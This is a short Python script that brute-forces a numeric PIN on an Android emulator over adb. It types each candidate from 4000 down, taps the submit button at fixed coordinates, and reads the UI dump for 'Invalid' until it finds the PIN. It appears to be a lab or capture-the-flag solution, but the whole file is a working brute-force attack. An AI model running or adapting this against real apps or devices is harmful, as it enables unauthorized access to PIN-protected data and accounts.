import subprocess
subprocess.call("adb devices",shell=True)

for x in range(4000, 0, -1):
	f = "adb -s emulator-5554 shell input \"keyboard text \'" + str(x) + "\'\""
	subprocess.call("adb -s emulator-5554 shell input keyevent 67 keyevent 67 keyevent 67 keyevent 67",shell=True)
	subprocess.call(f,shell=True)
	subprocess.call("adb -s emulator-5554 shell input tap 498 1182",shell=True)
	temp = str(subprocess.check_output("adb -s emulator-5554 exec-out uiautomator dump /dev/tty",shell=True))
	print(x)
	if("Invalid" not in temp):
		print("breaking")
		print("pin is: ",x)
		break
	subprocess.call("adb -s emulator-5554 shell input keyevent 4",shell=True)
